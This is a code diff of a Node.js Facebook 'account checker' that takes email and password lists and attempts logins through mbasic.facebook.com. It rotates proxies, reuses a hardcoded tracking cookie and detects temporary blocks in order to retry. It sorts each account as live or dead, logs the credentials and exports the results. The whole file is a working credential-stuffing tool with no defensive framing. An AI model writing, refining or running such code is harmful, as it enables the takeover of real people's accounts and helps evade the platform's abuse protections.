@@ -3,11 +3,9 @@ const axios = require('axios')
 const jsdom = require('jsdom');
 const { JSDOM } = jsdom;
 const fs = require('fs');
-const { Cookie } = require('tough-cookie');
 const { parentPort } = require("worker_threads");
 require('dotenv').config();
 const HttpsProxyAgent = require('https-proxy-agent');
-const { CookieJar } = require('tough-cookie');
 
 axios.defaults.withCredentials = true;
 const USERNAME = process.env.USERNAME
@@ -33,9 +31,11 @@ const getHtmlMBasic = async (url,err,instance,callback) =>{
       headers: {
         // 'Access-Control-Allow-Origin': 'https://mbasic.facebook.com/login/',
         // 'Access-Control-Allow-Credentials': 'true',
+        accept: `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7`,
         "accept-language": "en-US,en;q=0.9",
+        
 //USE PROXY'S COLDPROXY
-        'cookie': 'datr=f3VDZAMW8wOPiejWVC9ALl31'
+        'cookie': 'datr=d2dHZOgnIUtcsKuPo7wiblBV'
 ///////////////////////////////////////////////////////
 
         
@@ -85,35 +85,33 @@ const Start = async (acc,pass,err,proxyList,countProxy,callback) =>{
   }else {
     countProxy=0
   }
-  const proxyAgent = new HttpsProxyAgent(`http://${proxy[countProxy].PROXY_HOST}:${proxy[countProxy].PROXY_PORT}`);
-  const instance = axios.create({
+  const port  = proxy[countProxy].PROXY_PORT.trim()
+  const proxyAgent = await new HttpsProxyAgent(`http://${proxy[countProxy].PROXY_HOST}:${port}`);
+  const instance =await axios.create({
     httpsAgent: proxyAgent,
-    timeout: 3000,
-    withCredentials: true, 
+    withCredentials: true
   })
   if(err < 3)
   {
     try {
       const html = await getHtmlMBasic(FB_URL,err,instance,async (err)=>{
-        
       })
-      
       
       const dom = new JSDOM(html.data);
       const isBlock = await dom.window.document.querySelector('div [title="You’re Temporarily Blocked"]')
       if(isBlock){
-        console.log('Block getHTML')
+        console.log("block gethtml")
       }
+      
       const payload = await getValue(dom,acc,pass,err)
+      
       let cookie
 //USE PROXY'S COLDPROXY
-
-      const cookieSd = html.headers['set-cookie'][0].split(";")[0]
-      cookie = 'datr=f3VDZAMW8wOPiejWVC9ALl31' + ";" + cookieSd
-
-/////////////////////////////////////////////////////////////////
-
       
+      const cookieSd = await html.headers['set-cookie'][0].split(";")[0]
+      cookie = `datr=d2dHZOgnIUtcsKuPo7wiblBV;${cookieSd}`
+      
+/////////////////////////////////////////////////////////////////
       // const setCookies = await html.headers['set-cookie'].map(item =>{
       //   return item.split(";")[0]
       // })
@@ -121,12 +119,12 @@ const Start = async (acc,pass,err,proxyList,countProxy,callback) =>{
       
       const option = {
         headers:{
-            'cookie': cookie,
-            'User-Agent': html.config.headers['User-Agent'],
-            'origin':`https://mbasic.facebook.com`,
-            'content-type': `application/x-www-form-urlencoded`,
-            accept: `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7`,
-            "accept-language": "en-US,en;q=0.9"
+          'origin':`https://mbasic.facebook.com`,
+          'content-type': `application/x-www-form-urlencoded`,
+          "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7`,
+          'referer': 'https://mbasic.facebook.com/',
+          "cookie": cookie,
+          "accept-language": `en-US,en;q=0.9`
         }
       }
       
@@ -138,16 +136,17 @@ const Start = async (acc,pass,err,proxyList,countProxy,callback) =>{
       const live = await isLogin.window.document.querySelector('table span.s') ? await isLogin.window.document.querySelector('table span.s').innerHTML :''
       const block = await isLogin.window.document.querySelector('div [title="You’re Temporarily Blocked"]')
         if(live){
-          console.log('live')
+          console.log(acc,pass,'live')
          await callback(acc,pass,'live')
         }else if(die == 'Invalid username or password'){
           console.log(acc,pass,'die')
+          console.log(die)
           await callback(acc,pass,'die')
         }else if(block)
         {
           err++
           countProxy++
-          console.log("Block",block)
+          console.log("Block")
          await Start(acc,pass,err,proxyList,countProxy,callback)
         }else {
           await callback(acc,pass,'die')
@@ -158,7 +157,6 @@ const Start = async (acc,pass,err,proxyList,countProxy,callback) =>{
       err++
       if(error.message == `Cannot read properties of null (reading 'value')`)
       {
-        console.log('true')
         err=3
       }
       await Start(acc,pass,err,proxyList,countProxy,callback)
@@ -197,7 +195,7 @@ const Start = async (acc,pass,err,proxyList,countProxy,callback) =>{
  
 const main = async (listAcc,proxyList,count) =>{
     for(let i=0;i<listAcc.length;i++){
-      const pass = listAcc[i].password.trim()
+      const pass = await listAcc[i].password.trim()
       await Start(listAcc[i].email,pass,0,proxyList,i,async (acc,pas,type)=>{
         await exportData(acc,pas,type,count)
         })
